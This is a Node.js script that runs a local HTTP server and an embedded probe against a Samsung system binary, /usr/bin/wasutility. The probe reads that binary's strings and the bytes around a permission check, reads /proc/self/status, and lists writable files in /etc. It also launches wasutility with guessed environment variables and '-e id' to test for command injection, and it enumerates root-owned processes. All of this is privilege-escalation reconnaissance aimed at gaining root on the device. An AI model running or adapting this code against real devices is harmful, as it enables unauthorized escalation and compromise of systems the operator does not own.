'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8165;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe77h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Full strings extraction from wasutility
  'try {',
  '  var buf = fs.readFileSync("/usr/bin/wasutility");',
  '  r.was_size = buf.length;',
  '  var strs = [];',
  '  var run = 0, start = 0;',
  '  for (var i = 0; i < buf.length; i++) {',
  '    var b = buf[i];',
  '    if (b >= 32 && b < 127) {',
  '      if (run === 0) start = i;',
  '      run++;',
  '    } else {',
  '      if (run >= 5) strs.push({ off: start, s: buf.slice(start, start+run).toString("ascii") });',
  '      run = 0;',
  '    }',
  '  }',
  '  if (run >= 5) strs.push({ off: start, s: buf.slice(start, start+run).toString("ascii") });',
  '  r.strings_count = strs.length;',
  '  // Filter for interesting ones: paths, env vars, options, error msgs',
  '  r.strings_paths = strs.filter(function(s){ return s.s.charAt(0) === "/"; }).slice(0, 60);',
  '  r.strings_env = strs.filter(function(s){ return s.s === s.s.toUpperCase() && s.s.length >= 3 && /^[A-Z_][A-Z0-9_]+$/.test(s.s); }).slice(0, 40);',
  '  r.strings_misc = strs.filter(function(s){ return s.s.indexOf("-e") > -1 || s.s.indexOf("exec") > -1 || s.s.indexOf("shell") > -1 || s.s.indexOf("cmd") > -1 || s.s.indexOf("Usage") > -1 || s.s.indexOf("Error") > -1 || s.s.indexOf("fail") > -1 || s.s.indexOf("root") > -1 || s.s.indexOf("uid") > -1 || s.s.indexOf("wasm") > -1 || s.s.indexOf("was") > -1 || s.s.indexOf("samsung") > -1; }).slice(0, 50);',
  '} catch(e) { r.was_read_err = e.message; }',

  // 2. Read 256 bytes around the permission check at 0x7e4b (expand to 0x7d00-0x7f00)
  'try {',
  '  var buf2 = fs.readFileSync("/usr/bin/wasutility");',
  '  var base = 0x7d00;',
  '  var len = 0x200;',
  '  r.code_region = {',
  '    base: "0x" + base.toString(16),',
  '    hex: buf2.slice(base, base+len).toString("hex"),',
  '  };',
  '  // Also read the bytes right at 0x7e40-0x7e60 (tighter view)',
  '  var tight = 0x7e40;',
  '  r.code_tight = { base: "0x" + tight.toString(16), hex: buf2.slice(tight, tight+32).toString("hex") };',
  '} catch(e) { r.code_err = e.message; }',

  // 3. Check /proc/self/status to see our actual uid/gid
  'try { r.self_status = fs.readFileSync("/proc/self/status","utf8").split("\\n").slice(0,30).join("\\n"); } catch(e) { r.status_err = e.message; }',

  // 4. Find writable files owned by root or other users in /etc (Samsung config)
  'try {',
  '  var etcFiles = fs.readdirSync("/etc");',
  '  r.etc_writable = [];',
  '  etcFiles.forEach(function(f) {',
  '    try {',
  '      var p = "/etc/" + f;',
  '      var s = fs.statSync(p);',
  '      // writable by us (uid=5001, gid=100 or supplemental groups)',
  '      if ((s.mode & 2) || (s.gid === 100 && (s.mode & 16)) || (s.uid === 5001 && (s.mode & 128))) {',
  '        r.etc_writable.push({ path: p, mode: s.mode.toString(8), uid: s.uid, gid: s.gid });',
  '      }',
  '    } catch(e) {}',
  '  });',
  '} catch(e) { r.etc_err = e.message; }',

  // 5. Try wasutility with various env vars set
  'var envTests = [',
  '  { WASABI_CMD: "id", WAS_CMD: "id", SAMSUNG_CMD: "id" },',
  '  { WAS_DEBUG: "1" },',
  '  { WAS_ROOT: "1" },',
  '  { WAS_EXEC: "id" },',
  '  { WASUTIL_CMD: "id" }',
  '];',
  'r.was_env_tests = {};',
  'envTests.forEach(function(env, idx) {',
  '  try {',
  '    var opts = { timeout: 3000, env: {} };',
  '    Object.keys(process.env).forEach(function(k){ opts.env[k] = process.env[k]; });',
  '    Object.keys(env).forEach(function(k){ opts.env[k] = env[k]; });',
  '    var o = cp.spawnSync("/usr/bin/wasutility", ["-e", "id"], opts);',
  '    r.was_env_tests[JSON.stringify(env)] = {',
  '      status: o.status,',
  '      out: ((o.stdout||Buffer.from("")).toString()+(o.stderr||Buffer.from("")).toString()).trim().slice(0,150)',
  '    };',
  '  } catch(e) { r.was_env_tests[JSON.stringify(env)] = e.message.slice(0,60); }',
  '});',

  // 6. List processes running as root with their exe paths
  'try {',
  '  var pidlist = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  r.root_procs = [];',
  '  for (var i = 0; i < pidlist.length; i++) {',
  '    try {',
  '      var st = fs.readFileSync("/proc/" + pidlist[i] + "/status", "utf8");',
  '      if (st.indexOf("\\nUid:\\t0\\t") > -1) {',
  '        var name = "";',
  '        var nm = st.match(/^Name:\\t(.+)/m);',
  '        if (nm) name = nm[1];',
  '        var exepath = "";',
  '        try { exepath = fs.readlinkSync("/proc/" + pidlist[i] + "/exe"); } catch(e) {}',
  '        r.root_procs.push({ pid: pidlist[i], name: name, exe: exepath });',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) { r.root_procs_err = e.message; }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
